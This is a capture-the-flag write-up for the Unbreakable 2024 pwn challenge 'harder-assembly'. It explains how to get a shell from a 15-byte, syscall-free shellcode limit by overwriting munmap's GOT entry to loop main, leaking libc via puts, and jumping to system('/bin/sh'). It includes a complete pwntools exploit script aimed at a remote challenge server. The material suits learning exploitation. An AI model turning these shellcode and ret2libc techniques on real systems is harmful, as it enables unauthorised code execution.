---
title: harder-assembly
type: writeup
date: 2024-04-07T14:23:28+03:00
description: Writeup for harder-assembly [Unbreakable 2024]
author: sunbather
tags:
- pwn
- asm
draft: false
---
___

## Challenge Description

I want the shell, but they want me to work for it, this time even harder :(

## Intuition

We receive a binary that essentially takes 15 bytes as input, checks if it contains the byte sequence ``0x0f05`` and then executes the input as shellcode. The sequence ``0x0f05`` corresponds to ``syscall``. Therefore, we can assume we have 15 bytes to get a shell, but we have to not use ``syscall`` as part of our shellcode. Somewhat cleaned-up main function below:

```c
void main(void)
{
  long lVar1;
  char *__buf;
  long in_FS_OFFSET;
  int i;
  char copy_buf [15];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  copy_buf[0] = '\0';
  copy_buf[1] = '\0';
  copy_buf[2] = '\0';
  copy_buf[3] = '\0';
  copy_buf[4] = '\0';
  copy_buf[5] = '\0';
  copy_buf[6] = '\0';
  copy_buf[7] = '\0';
  copy_buf[8] = '\0';
  copy_buf[9] = '\0';
  copy_buf[10] = '\0';
  copy_buf[11] = '\0';
  copy_buf[12] = '\0';
  copy_buf[13] = '\0';
  copy_buf[14] = '\0';
  syscall();
  __buf = (char *)mmap((void *)0x0,0xf,7,0x22,0,0);
  read(0,__buf,0xf);
  copy_buf._0_8_ = *(undefined8 *)__buf;
  copy_buf._8_4_ = *(undefined4 *)(__buf + 8);
  copy_buf._12_2_ = *(undefined2 *)(__buf + 0xc);
  copy_buf[14] = __buf[0xe];
  for (i = 0; i < 0xf; i = i + 1) {
    if ((copy_buf[i] == '\x0f') && (copy_buf[i + 1] == '\x05')) {
      puts("You are not allowed to do that.");
      exit(0);
    }
  }
  (*(code *)__buf)();
  munmap(__buf,0xf);
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Usually, when you're limited in your "moves" in pwn challenges, the first step you need to think about is how to remove the limit. Therefore, our initial idea was to somehow get more than 15 bytes of shellcode running. We cannot modify the amount we are allowed to input, because it is hardcoded in the .text data, which is not writeable... We notice a call to mprotect hidden in the assembly, that makes the GOT RWX, which gives us the great idea to hijack functions from GOT:

```
004012a0 6a 0a           PUSH       0xa
004012a2 58              POP        RAX
004012a3 68 00 40        PUSH       _GLOBAL_OFFSET_TABLE_                            = 00403e20
         40 00
004012a8 5f              POP        RDI
004012a9 68 00 10        PUSH       0x1000
         00 00
004012ae 5e              POP        RSI
004012af 6a 07           PUSH       0x7
004012b1 5a              POP        RDX
004012b2 0f 05           SYSCALL
```

We can see that the only functions called after our shellcode are *munmap* and *__stack_chk_fail*. We can't trigger the stack fail, as there is no buffer overflow, so we choose to overwrite *munmap* with the address for *main*. And ta-da, we have infinite[^inf] 15 bytes shellcodes to run by returning to main in a closed loop. We overwrite munmap like so:

```asm
mov edi, 0x00404038 ; move the GOT location for munmap in rdi
mov eax, 0x0040125b ; move main address in rax
mov [rdi], rax      ; write main address to where rdi points
nop                 ; prob not necessary just wanted to pad to 15
ret                 ; ret so we don't start executing random data
```

Notice the weird random use of the 4-bytes registers edi and eax. This is because some opcodes are smaller in width when using smaller registers. So it let me use them without going over the 15 bytes limit.

Now, we can easily leak libc by printing the puts GOT address with a jump to puts from PLT:

```asm
mov rax, 0x004010a0  ; load puts addr from PLT into rax
mov edi, 0x00404018  ; load puts addr from GOT into rdi
call rax             ; call plt_puts(got_puts)
ret
```

We get the libc version with [https://libc.blukat.me/](https://libc.blukat.me/) and get the offsets to ``system`` and ``/bin/sh``. Then we just set up rdi and call ``system`` directly. We use a trick for setting up rdi before calling ``system``, which is to load ``/bin/sh`` address into r12 one _main_ iteration before. We do this because ``mov rdi, ADDR`` is bigger in width than ``mov rdi, r12`` and r12 is not changed between _main_ calls. Last two shellcodes below:
```asm
trick:
	mov r12, BIN_SH_ADDR
	ret

call_system:
	mov rdi, r12
	mov rax, SYSTEM_ADDR
	jmp rax
```

Notice the jmp to rax instead of a call. Calling ``system`` instead of jumping to it will crash it because the stack is misaligned.

## Solution

```py
#!/usr/bin/env python3

from pwn import *

context.update(arch='amd64', os='linux')

# libc6_2.35-0ubuntu3.5_amd64
system_offset = -0x300e0
bin_sh_offset = 0x157828

def inspect_payload(payload):
    print(payload, len(payload))


# overwrite munmap with main
payload = asm(
    """
    mov edi, 0x00404038
    mov eax, 0x0040125b
    mov [rdi], rax
    nop
    ret
    """
)

# leak puts addr
leak_payload = asm(
    """
    mov rax, 0x004010a0
    mov edi, 0x00404018
    call rax
    ret
    """
)


#target = process("./harder")
target = remote("34.89.210.219", 31120)

inspect_payload(payload)
target.send(payload)

inspect_payload(leak_payload)
target.send(leak_payload)
leak = u64(target.recvline().strip() + b"\x00\x00")
print(f"PUTS LEAK:{hex(leak)}")

test = asm(f"mov r12, {leak+bin_sh_offset}\nret\n")
inspect_payload(test)
target.send(test)

pwn_time = asm(f"mov rdi, r12\nmov rax, {leak+system_offset}\njmp rax\n")
inspect_payload(pwn_time)
target.send(pwn_time)

target.interactive()
```

[^inf]: Okay fine not _infinite_... We can call it as long as we don't overflow the stack segment allocated in virtual memory. Check out [this video from Laurie Wired](https://youtu.be/_6zAAhkU_Iw?si=HvPFU2ys61S6meYU) to see what I mean.
